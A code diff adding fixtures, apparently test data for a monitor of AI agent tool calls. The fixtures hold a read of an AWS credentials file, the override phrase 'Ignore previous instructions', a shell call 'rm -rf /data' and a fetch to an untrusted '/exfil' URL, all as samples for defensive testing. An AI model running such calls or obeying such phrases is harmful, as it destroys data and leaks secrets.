@@ -100,6 +100,10 @@ FIXTURES: dict[str, list[dict]] = {
                  "arguments": {"path": "/home/user/.aws/credentials"}}, "meta": {}},
         {"raw": {"tool": "run_query", "session_id": "sess-2",
                  "arguments": {"q": "Ignore previous instructions"}}, "meta": {}},
+        {"raw": {"tool": "run_shell", "session_id": "sess-3",
+                 "arguments": {"cmd": "rm -rf /data"}}, "meta": {}},
+        {"raw": {"tool": "fetch_url", "session_id": "sess-4",
+                 "arguments": {"url": "https://untrusted.example.net/exfil"}}, "meta": {}},
     ],
     "opcua_audit": [
         {"raw": {"eventType": "AuditCreateSessionEventType", "clientUserId": "engineer01",
